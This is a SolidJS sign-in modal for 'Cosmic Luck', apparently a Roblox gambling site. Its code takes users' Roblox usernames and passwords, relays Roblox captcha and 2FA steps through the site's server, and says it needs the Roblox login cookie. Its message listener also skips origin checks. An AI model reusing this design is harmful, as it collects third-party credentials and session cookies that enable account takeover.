import {createSignal, onCleanup} from "solid-js";
import {A, useSearchParams} from "@solidjs/router";
import {api, authedAPI, createNotification, fetchUser, getJWT} from "../../util/api";
import {useUser} from "../../contexts/usercontextprovider";
import Toggle from "../Toggle/toggle";
import RobloxMFA from "../MFA/robloxmfa";

function SignIn(props) {

    const [searchParams, setSearchParams] = useSearchParams()
    const [agree, setAgree] = createSignal(false)
    const [mode, setMode] = createSignal(0)

    const [username, setUsername] = createSignal('')
    const [password, setPassword] = createSignal('')

    const [user, { mutateUser }] = useUser()

    const [isLoggingIn, setIsLoggingIn] = createSignal(false)
    const [twoFactorOpen, setTwoFactorOpen] = createSignal(false)
    const [captchaOpen, setCaptchaOpen] = createSignal(false)

    const [loginId, setLoginId] = createSignal(null)
    const [blob, setBlob] = createSignal(null)

    window.addEventListener('message', handleIFrameMessage)

    async function handleIFrameMessage(event) {
        let data = event.data
        if (!data || data.type !== 'captcha') return

        let loginRes = await api('/auth/login/captcha', 'POST', JSON.stringify({
            loginId: loginId(),
            captchaToken: data.token
        }), true)
        handleLoginData(loginRes)

        setCaptchaOpen(false)
    }

    async function handleLoginData(data, stayOpenOnFail) {
      if (!data || data.error) {
        cancelLogin(stayOpenOnFail)
        return false
      }

        if (data.phase && data.phase === 'CAPTCHA') {
            setLoginId(data.loginId)
            setBlob(data.captcha.dxBlob)
            setCaptchaOpen(true)
            setTwoFactorOpen(false)
            setIsLoggingIn(true)
            return false
        }

        if (data.phase && data.phase === '2FA') {
          setLoginId(data.loginId)
            setIsLoggingIn(true)
            setTwoFactorOpen(true)
            setCaptchaOpen(false)
            return false
        }

        if (data.token) {
          try {
            const expires = new Date(Date.now() + data.expiresIn * 1000)
            const secure = window.location.protocol === 'https:' ? ' Secure;' : ''
            document.cookie = `jwt=${encodeURIComponent(data.token)}; Path=/; SameSite=Lax;${secure} expires=${expires.toUTCString()}`

            if (props?.ws() && props.ws().connected) {
              props.ws().emit('auth', data.token)
                }

            const currentUser = await fetchUser()
            if (!currentUser) {
              createNotification('error', 'Signed in, but your account could not be loaded. Please try again.')
              return false
            }
            mutateUser(currentUser)

            const code = localStorage.getItem('aff')
            if (code) {
              const res = await authedAPI('/user/affiliate', 'POST', JSON.stringify({ code }), true)
              if (res?.success) {
                createNotification('success', `Successfully redeemed affiliate code ${code}.`)
              }
              localStorage.removeItem('aff')
            }

            close()
            return true
          } finally {
            setIsLoggingIn(false)
          }
        }

        cancelLogin()
        return false
    }

    function cancelLogin(stayOpenOnFail) {
        if (stayOpenOnFail) return

        setCaptchaOpen(false)
        setTwoFactorOpen(false)
        setIsLoggingIn(false)
        setLoginId(null)
        setBlob(null)
    }

    function close() {
      setSearchParams({ modal: null }, { replace: true })
    }

    onCleanup(() => window.removeEventListener('message', handleIFrameMessage))

    return (
        <>
            <div class='modal' onClick={() => close()}>
                <div class='signin-container' onClick={(e) => e.stopPropagation()}>
                    <p class='close bevel' onClick={() => close()}>X</p>

                    <div class='content'>
                        <div class='content-header'>
                            <h2>WELCOME BACK</h2>
                            <h1>SIGN IN TO <span class='green'>COSMIC LUCK</span></h1>
                        </div>

                        <div class='bar'/>

                        <div class='oauth-buttons'>
                            <a class='oauth-btn steam-oauth' href='/auth/steam'>
                                <svg width='18' height='18' viewBox='0 0 24 24' fill='currentColor' xmlns='http://www.w3.org/2000/svg'>
                                    <path d='M11.979 0C5.678 0 .511 4.86.022 11.037l6.432 2.658c.545-.371 1.203-.59 1.912-.59.063 0 .125.004.188.006l2.861-4.142V8.91c0-2.495 2.028-4.524 4.524-4.524 2.494 0 4.524 2.031 4.524 4.527s-2.03 4.525-4.524 4.525h-.105l-4.076 2.911c0 .052.004.105.004.159 0 1.875-1.515 3.396-3.39 3.396-1.635 0-3.016-1.173-3.331-2.718L.436 15.27C1.862 20.307 6.486 24 11.979 24c6.627 0 11.999-5.373 11.999-12S18.605 0 11.979 0zM7.54 18.21l-1.473-.61c.262.543.714.999 1.314 1.25 1.297.539 2.793-.076 3.332-1.375.263-.63.264-1.319.005-1.949s-.75-1.121-1.377-1.383c-.624-.26-1.29-.249-1.878-.03l1.523.63c.956.4 1.409 1.5 1.009 2.455-.397.957-1.497 1.41-2.454 1.012H7.54zm11.415-9.303c0-1.662-1.353-3.015-3.015-3.015-1.665 0-3.015 1.353-3.015 3.015 0 1.665 1.35 3.015 3.015 3.015 1.663 0 3.015-1.35 3.015-3.015zm-5.273-.005c0-1.252 1.013-2.266 2.265-2.266 1.249 0 2.266 1.014 2.266 2.266 0 1.251-1.017 2.265-2.266 2.265-1.252 0-2.265-1.014-2.265-2.265z'/>
                                </svg>
                                Continue with Steam
                            </a>
                            <a class='oauth-btn google-oauth' href='/auth/google'>
                                <svg width='18' height='18' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'>
                                    <path d='M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z' fill='#4285F4'/>
                                    <path d='M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z' fill='#34A853'/>
                                    <path d='M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z' fill='#FBBC05'/>
                                    <path d='M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z' fill='#EA4335'/>
                                </svg>
                                Continue with Google
                            </a>
                        </div>

                        <div class='divider'>
                            <span class='divider-line'/>
                            <span class='divider-text'>or sign in with credentials</span>
                            <span class='divider-line'/>
                        </div>

                        <p class='label'>ROBLOX USERNAME</p>
                        <div class='input-wrap'>
                            <svg class='input-icon' width='14' height='16' viewBox='0 0 14 16' fill='none' xmlns='http://www.w3.org/2000/svg'><path d='M7 8C9.20914 8 11 6.20914 11 4C11 1.79086 9.20914 0 7 0C4.79086 0 3 1.79086 3 4C3 6.20914 4.79086 8 7 8Z' fill='currentColor'/><path d='M0 16C0 12.134 3.13401 9 7 9C10.866 9 14 12.134 14 16H0Z' fill='currentColor'/></svg>
                            <input type='text' placeholder='Enter your username' class='credentials' value={username()} onChange={(e) => setUsername(e.target.value)}/>
                        </div>

                        <p class='label'>PASSWORD</p>
                        <div class='input-wrap'>
                            <svg class='input-icon' width='13' height='16' viewBox='0 0 13 16' fill='none' xmlns='http://www.w3.org/2000/svg'><rect x='0' y='7' width='13' height='9' rx='2' fill='currentColor'/><path d='M2.5 7V4.5C2.5 2.567 4.067 1 6 1H7C8.933 1 10.5 2.567 10.5 4.5V7' stroke='currentColor' stroke-width='1.8' fill='none'/></svg>
                            <input type='password' placeholder='Enter your password' class='credentials' value={password()} onChange={(e) => setPassword(e.target.value)}/>
                        </div>

                        <div class='tos'>
                            <Toggle active={agree()} toggle={() => setAgree(!agree())}/>
                            <p>By checking this box you agree to our <a href='/docs/tos' class='tos-link'>Terms & Conditions</a></p>
                        </div>

                        <button class='signin-btn' onClick={async () => {
                            if (!agree()) return createNotification('error', 'You must accept our Terms and Conditions')
                            if (isLoggingIn()) return
                            setIsLoggingIn(true)
                          try {
                            const data = await api('/auth/login', 'POST', JSON.stringify({ username: username(), password: password() }), true)
                            await handleLoginData(data)
                          } catch (error) {
                            console.error('Login failed:', error)
                            createNotification('error', 'Unable to complete sign in. Please try again.')
                            cancelLogin()
                          }
                        }}>
                            {isLoggingIn() ? (
                                <span class='btn-loading'>SIGNING IN…</span>
                            ) : (
                                <>
                                    <svg width='12' height='12' viewBox='0 0 12 12' fill='none' xmlns='http://www.w3.org/2000/svg'><path d='M0.5 0.5L11.5 6L0.5 11.5V7L8 6L0.5 5V0.5Z' fill='currentColor'/></svg>
                                    SIGN IN
                                </>
                            )}
                        </button>

                        <div class='disclaimer'>
                            In order for <span class='green bold'>CosmicLuck.gg</span> to operate correctly, we require access to your Roblox account login cookie.
                            We assure you that <span class='bold white'>Cosmic Luck</span> will protect your security and never use it without your permission.
                        </div>
                    </div>

                    <div class='art'>
                        <div class='art-brand'>
                            <img src='/assets/logo/cosmic-luck-logo.png' alt='Cosmic Luck' class='art-logo'/>
                        </div>

                        <div class='art-coins'>
                            <img src='/assets/art/signintop.png' alt='' draggable={false} class='art-img'/>
                        </div>

                        <p class='confirm'>
                            By accessing <span class='bold white'>Cosmic Luck</span>, I attest that I am at least 18 years old and have read the <a href='/docs/tos' class='confirm-link'>Terms & Conditions.</a>
                        </p>
                    </div>
                </div>
            </div>

            {twoFactorOpen() && (
                <RobloxMFA close={cancelLogin} complete={async (code) => {
                    let loginRes = await api('/auth/login/2fa', 'POST', JSON.stringify({
                        loginId: loginId(),
                        code
                    }), true)
                    let response = handleLoginData(loginRes, true)
                }}/>
            )}

            {captchaOpen() && (
                <div class='modal' onClick={cancelLogin}>
                    <div class='captcha-container' onClick={(e) => e.stopPropagation()}>
                        <p>Solve the Captcha</p>
                        <iframe src={`${import.meta.env.VITE_SERVER_URL}/auth/iframe?blob=${encodeURIComponent(blob())}`} width='310px' height='295px'/>
                        <div id='captcha-div'/>
                    </div>
                </div>
            )}

            <style jsx>{`
                .modal {
                  position: fixed;
                  top: 0; left: 0;
                  width: 100vw; height: 100vh;
                  background: rgba(6, 8, 12, 0.82);
                  backdrop-filter: blur(6px);
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  z-index: 1000;
                }

                .signin-container {
                  max-width: 880px;
                  max-height: 600px;
                  height: 100%;
                  width: 100%;
                  background: #0e1116;
                  border: 1px solid rgba(255,255,255,0.07);
                  box-shadow: 0 32px 80px rgba(0,0,0,0.7), 0 0 0 1px rgba(31,214,95,0.04);
                  border-radius: 18px;
                  display: flex;
                  position: relative;
                  overflow: hidden;
                }

                .captcha-container {
                  max-width: 450px;
                  color: white;
                  width: 100%;
                  background: #0e1116;
                  border: 1px solid rgba(255,255,255,0.07);
                  border-radius: 18px;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  font-weight: 700;
                  padding: 28px 0;
                  gap: 24px;
                  position: relative;
                  overflow: hidden;
                }

                .close {
                  position: absolute;
                  top: 14px; left: 14px;
                  width: 28px; height: 28px;
                  background: rgba(255,255,255,0.05);
                  border: 1px solid rgba(255,255,255,0.08);
                  border-radius: 7px;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  font-size: 10px;
                  font-weight: 700;
                  color: #4b5260;
                  cursor: pointer;
                  transition: background .2s, color .2s;
                  z-index: 10;
                }
                .close:hover { background: rgba(255,255,255,0.09); color: #c3cad6; }

                /* ── Left panel ── */
                .content {
                  width: 100%;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  padding: 36px 48px 0;
                  background: #0e1116;
                }

                .content-header {
                  display: flex;
                  flex-direction: column;
                  gap: 4px;
                  margin-bottom: 6px;
                  align-self: flex-start;
                  max-width: 380px;
                  width: 100%;
                }

                h2 {
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 700;
                  font-size: 10px;
                  letter-spacing: 0.15em;
                  color: #4b5260;
                  margin: 0 0 3px;
                  text-transform: uppercase;
                }

                h1 {
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 800;
                  font-size: 22px;
                  color: #ffffff;
                  margin: 0;
                  line-height: 1.1;
                }

                .green { color: #1fd65f; }
                .white { color: #c3cad6; }
                .bold { font-weight: 700; }

                .bar {
                  width: 100%;
                  max-width: 380px;
                  height: 1px;
                  margin: 20px 0 18px;
                  background: linear-gradient(90deg, transparent 0%, rgba(31,214,95,0.3) 50%, transparent 100%);
                }

                .options {
                  width: 100%;
                  max-width: 380px;
                  display: flex;
                  gap: 6px;
                  margin-bottom: 8px;
                  background: rgba(255,255,255,0.03);
                  border: 1px solid rgba(255,255,255,0.06);
                  border-radius: 8px;
                  padding: 4px;
                }

                .option {
                  flex: 1;
                  height: 32px;
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 700;
                  font-size: 11px;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  color: #4b5260;
                  cursor: pointer;
                  outline: unset;
                  border: none;
                  background: transparent;
                  border-radius: 6px;
                  transition: background .2s, color .2s;
                }
                .option:hover { color: #8b92a0; background: rgba(255,255,255,0.04); }
                .option.active {
                  background: rgba(31,214,95,0.12);
                  color: #1fd65f;
                  border: 1px solid rgba(31,214,95,0.25);
                }

                .label {
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 700;
                  font-size: 10px;
                  letter-spacing: 0.1em;
                  color: #4b5260;
                  align-self: flex-start;
                  margin: 14px 0 6px;
                  max-width: 380px;
                  width: 100%;
                }

                .input-wrap {
                  width: 100%;
                  max-width: 380px;
                  position: relative;
                  display: flex;
                  align-items: center;
                }

                .input-icon {
                  position: absolute;
                  left: 14px;
                  color: #4b5260;
                  pointer-events: none;
                  z-index: 1;
                  flex-shrink: 0;
                }

                .credentials {
                  width: 100%;
                  height: 46px;
                  outline: unset;
                  border: 1px solid rgba(255,255,255,0.07);
                  background: #12151c;
                  border-radius: 8px;
                  padding: 0 14px 0 40px;
                  font-family: 'Rubik', sans-serif;
                  font-size: 13px;
                  font-weight: 400;
                  color: #c3cad6;
                  transition: border-color .2s, background .2s;
                }
                .credentials:focus {
                  border-color: rgba(31,214,95,0.45);
                  background: #141820;
                  outline: none;
                }
                .credentials::placeholder { color: #2e3440; }

                .tos {
                  margin: 16px 0 0;
                  display: flex;
                  align-items: center;
                  gap: 9px;
                  width: 100%;
                  max-width: 380px;
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-size: 11px;
                  font-weight: 500;
                  color: #4b5260;
                }

                .oauth-buttons {
                  width: 100%;
                  max-width: 380px;
                  display: flex;
                  flex-direction: column;
                  gap: 8px;
                  margin-bottom: 4px;
                }

                .oauth-btn {
                  width: 100%;
                  height: 44px;
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 10px;
                  border-radius: 8px;
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 700;
                  font-size: 13px;
                  text-decoration: none;
                  cursor: pointer;
                  transition: filter .2s, box-shadow .2s;
                  border: 1px solid transparent;
                }

                .steam-oauth {
                  background: #1b2838;
                  border-color: #2a475e;
                  color: #c6d4df;
                }
                .steam-oauth:hover {
                  filter: brightness(1.15);
                  box-shadow: 0 4px 16px rgba(27, 40, 56, 0.6);
                }

                .google-oauth {
                  background: #ffffff;
                  border-color: #dadce0;
                  color: #3c4043;
                }
                .google-oauth:hover {
                  filter: brightness(0.96);
                  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
                }

                .divider {
                  width: 100%;
                  max-width: 380px;
                  display: flex;
                  align-items: center;
                  gap: 10px;
                  margin: 10px 0 2px;
                }

                .divider-line {
                  flex: 1;
                  height: 1px;
                  background: rgba(255, 255, 255, 0.07);
                }

                .divider-text {
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-size: 10px;
                  font-weight: 600;
                  letter-spacing: 0.08em;
                  color: #2e3440;
                  white-space: nowrap;
                }

                .tos-link {
                  color: #1fd65f;
                  font-weight: 700;
                  text-decoration: none;
                }
                .tos-link:hover { text-decoration: underline; }

                .signin-btn {
                  width: 100%;
                  max-width: 380px;
                  height: 46px;
                  margin: 20px 0 0;
                  outline: unset;
                  border: unset;
                  border-radius: 8px;
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 800;
                  font-size: 13px;
                  letter-spacing: 0.08em;
                  color: #021a09;
                  cursor: pointer;
                  background: linear-gradient(180deg, #22e86a 0%, #1fd65f 60%, #18c255 100%);
                  box-shadow: 0 1px 0 rgba(255,255,255,0.2) inset, 0 -2px 0 rgba(0,0,0,0.3) inset, 0 4px 16px rgba(31,214,95,0.25);
                  display: flex;
                  align-items: center;
                  justify-content: center;
                  gap: 8px;
                  transition: filter .2s, box-shadow .2s;
                }
                .signin-btn:hover {
                  filter: brightness(1.08);
                  box-shadow: 0 1px 0 rgba(255,255,255,0.2) inset, 0 -2px 0 rgba(0,0,0,0.3) inset, 0 6px 20px rgba(31,214,95,0.4);
                }

                .disclaimer {
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-size: 11px;
                  font-weight: 400;
                  text-align: center;
                  line-height: 1.7;
                  margin-top: auto;
                  padding: 14px 16px;
                  color: #2e3440;
                  border-top: 1px solid rgba(255,255,255,0.04);
                  width: 100%;
                }

                /* ── Right art panel ── */
                .art {
                  width: 100%;
                  max-width: 330px;
                  flex-shrink: 0;
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  justify-content: space-between;
                  padding: 32px 20px 20px;
                  position: relative;
                  border-left: 1px solid rgba(255,255,255,0.05);
                  overflow: hidden;
                  background: #090c11;
                }

                /* deep green radial glow at top */
                .art:before {
                  content: '';
                  position: absolute;
                  top: -60px; left: 50%;
                  transform: translateX(-50%);
                  width: 280px; height: 280px;
                  background: radial-gradient(circle, rgba(31,214,95,0.22) 0%, transparent 70%);
                  pointer-events: none;
                  z-index: 0;
                }

                /* subtle noise/texture overlay */
                .art:after {
                  content: '';
                  position: absolute;
                  inset: 0;
                  background: linear-gradient(180deg, transparent 50%, rgba(9,12,17,0.92) 100%);
                  pointer-events: none;
                  z-index: 1;
                }

                .art > * { position: relative; z-index: 2; }

                .art-brand {
                  display: flex;
                  flex-direction: column;
                  align-items: center;
                  gap: 10px;
                }

                .art-logo {
                  width: 100%;
                  max-width: 260px;
                  height: auto;
                  filter: drop-shadow(0 0 24px rgba(31,214,95,0.5)) drop-shadow(0 0 8px rgba(31,214,95,0.3));
                }

                .art-coins {
                  width: 100%;
                  height: 190px;
                  position: relative;
                  overflow: hidden;
                  flex-shrink: 0;
                }

                .art-img {
                  position: absolute;
                  bottom: 0;
                  left: 50%;
                  transform: translateX(-50%);
                  width: 230px;
                  filter: hue-rotate(95deg) saturate(1.15) brightness(0.95);
                }

                .confirm {
                  font-family: 'Geogrotesque Wide', sans-serif;
                  font-weight: 500;
                  font-size: 11px;
                  color: #3a4150;
                  text-align: center;
                  line-height: 1.7;
                  padding: 10px 12px;
                  border: 1px solid rgba(255,255,255,0.05);
                  border-radius: 8px;
                  background: rgba(255,255,255,0.02);
                  width: 100%;
                }

                .confirm-link {
                  color: #1fd65f;
                  font-weight: 700;
                  text-decoration: none;
                }
                .confirm-link:hover { text-decoration: underline; }

                h1, h2 { margin: unset; }

                iframe {
                  display: block;
                  margin: unset;
                  padding: unset;
                  border: none;
                }

                @media only screen and (max-width: 720px) {
                  .art { display: none; }
                  .signin-container { max-width: 480px; }
                  .content { padding: 28px 24px 0; }
                }
            `}</style>
        </>
    )
}

export default SignIn